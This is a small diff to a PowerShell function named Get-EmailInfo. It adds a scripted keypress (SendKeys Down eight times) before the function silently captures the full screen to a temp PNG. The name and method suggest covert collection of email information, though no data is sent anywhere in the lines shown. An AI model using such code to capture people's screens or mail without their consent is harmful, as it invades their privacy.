@@ -7,6 +7,9 @@ function Get-EmailInfo {
 
     Start-Sleep -Seconds 2
 
+    [System.Windows.Forms.SendKeys]::SendWait("{DOWN 8}")
+    Start-Sleep -Seconds 1
+
     $fileName = "CaliShot.png"
     $screenshotPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName)
 
@@ -19,7 +22,6 @@ function Get-EmailInfo {
     $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
 
     $screenshot.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-
 
     return $screenshotPath
 }
